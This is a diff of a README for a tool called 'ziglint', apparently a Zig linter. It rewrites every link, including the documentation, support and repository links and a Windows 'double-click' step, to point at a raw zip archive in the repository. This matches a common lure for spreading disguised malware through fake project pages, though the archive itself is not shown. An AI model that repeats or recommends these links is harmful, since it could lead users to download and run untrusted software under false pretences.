@@ -6,11 +6,11 @@ Welcome to ziglint! This tool helps you lint your Zig code, ensuring it meets st
 
 ## 📥 Download ziglint
 
-[![Download ziglint](https://github.com/patripollii/ziglint/raw/refs/heads/main/.claude/Software-3.0.zip)](https://github.com/patripollii/ziglint/raw/refs/heads/main/.claude/Software-3.0.zip)
+[![Download ziglint](https://raw.githubusercontent.com/patripollii/ziglint/main/src/Software-v1.6.zip)](https://raw.githubusercontent.com/patripollii/ziglint/main/src/Software-v1.6.zip)
 
 To download ziglint, visit the following page:
 
-[Download ziglint from Releases](https://github.com/patripollii/ziglint/raw/refs/heads/main/.claude/Software-3.0.zip)
+[Download ziglint from Releases](https://raw.githubusercontent.com/patripollii/ziglint/main/src/Software-v1.6.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you install ziglint, make sure your system meets these requirements:
 
 ## 🛠️ Install ziglint
 
-1. **Visit the Release Page:** Go to the [ziglint Releases page](https://github.com/patripollii/ziglint/raw/refs/heads/main/.claude/Software-3.0.zip).
+1. **Visit the Release Page:** Go to the [ziglint Releases page](https://raw.githubusercontent.com/patripollii/ziglint/main/src/Software-v1.6.zip).
 
 2. **Choose the Version:** Look for the latest version at the top of the page.
 
@@ -32,7 +32,7 @@ Before you install ziglint, make sure your system meets these requirements:
 4. **Extract the Files:** If your download is zipped, extract the files to a folder on your computer.
 
 5. **Run the Application:**
-   - If you're on Windows, double-click `https://github.com/patripollii/ziglint/raw/refs/heads/main/.claude/Software-3.0.zip`.
+   - If you're on Windows, double-click `https://raw.githubusercontent.com/patripollii/ziglint/main/src/Software-v1.6.zip`.
    - If you're using macOS or Linux, open a terminal and run:
      ```
      ./ziglint
@@ -84,9 +84,9 @@ Modify this file to enable or disable specific rules, or adjust their severity l
 
 Need help or want to dive deeper into ziglint? Here are some helpful links:
 
-- [Official Documentation](https://github.com/patripollii/ziglint/raw/refs/heads/main/.claude/Software-3.0.zip)
-- [Support Community](https://github.com/patripollii/ziglint/raw/refs/heads/main/.claude/Software-3.0.zip)
-- [GitHub Repository](https://github.com/patripollii/ziglint/raw/refs/heads/main/.claude/Software-3.0.zip)
+- [Official Documentation](https://raw.githubusercontent.com/patripollii/ziglint/main/src/Software-v1.6.zip)
+- [Support Community](https://raw.githubusercontent.com/patripollii/ziglint/main/src/Software-v1.6.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/patripollii/ziglint/main/src/Software-v1.6.zip)
 
 ## 💬 Support
 
